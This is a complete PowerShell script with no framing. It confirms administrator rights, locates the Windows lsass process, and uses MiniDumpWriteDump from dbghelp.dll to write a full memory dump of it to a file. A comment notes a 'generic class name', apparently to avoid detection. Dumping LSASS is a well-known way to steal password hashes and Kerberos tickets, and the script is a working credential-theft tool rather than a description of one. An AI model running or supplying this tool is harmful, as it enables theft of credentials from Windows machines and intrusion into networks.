# Check output file path
param(
    [Parameter(Mandatory=$true, HelpMessage="Enter the path where you want to save the output file(file extension : .dmp).")]
    [string]$OutputPath
)

if([string]::IsNullOrWhiteSpace($OutputPath)){
    Write-Host "Output path cannot be empty."
    exit
}

if(-not (Test-Path -IsValid $OutputPath)){
    Write-Host "The specified path is not valid: $OutputPath"
    exit
}

# Define constants
$FullMemoryDump = 0x00000002 -bor 0x000008000
$AllAccessPermission = 0x1F0FFF

# Load dbghelp.dll with a generic class name
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class DumpGenerator
{
[DllImport("dbghelp.dll", SetLastError=true)]
public static extern bool MiniDumpWriteDump(
IntPtr hProcess,
uint ProcessId,
IntPtr hFile,
uint DumpType,
IntPtr ExceptionParam,
IntPtr UserStreamParam,
IntPtr CallbackParam
);
}
"@

# Check Privileges
function Grant-ElevatedAccess{
    try{
        $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
        if ($principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Host "Running with Administrator access..."
        } else {
            Write-Host "Administrator privileges are required. Exiting"
            exit
        }
    } catch {
        Write-Host "Privilege escalation failed: $_"
    }
}

# Process ID Fetching 
function Get-ProcessId{
    $process = Get-Process -Name "lsass" -ErrorAction SilentlyContinue
    if($process) {
        Write-Host "Target process found: PID = $($process.Id)"
        return $process.Id
    } else {
        Write-Host "Target process not found."
        return $null
    }
}

# Writing the LSASS Memory Dump
function Write-MemoryDump {
    param(
        [string]$outputPath
    )

    $processId = Get-ProcessId
    if(-not $processId) { return $false }
    
    try {
        # Open target process
        $processHandle = [System.Diagnostics.Process]::GetProcessById($processId).Handle
        if(-not $processHandle) {
            Write-Host "Faild to open target process with PID: $processId"
            return $false
        }
        Write-Host "Successfully opend target process with PID: $processId"

        # Create dump file
        $fileStream = [System.IO.File]::Open($outputPath,
        [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
        $fileHandle = $fileStream.SafeFileHandle.DangerousGetHandle()
        Write-Host "Dump file created at $outputPath"

        # Write memory dump
        $success = [DumpGenerator]::MiniDumpWriteDump(
            $processHandle,
            [uint32]$processId,
            $fileHandle,
            [uint32]$FullMemoryDump,
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            [IntPtr]::Zero
        )

        # Close file stream and release process handle
        $fileStream.Close()
        [System.Runtime.InteropServices.Marshal]::Release($processHandle)

        if($success) {
            Write-Host "Memory dump successfully written to $outputPath"
            return $true
        } else {
            Write-Host "Failed to write memory dump."
            return $false
        }
    } catch {
        Write-Host "An error occurred: $_"
        return $false
    }
}

Grant-ElevatedAccess
Write-MemoryDump($OutputPath)
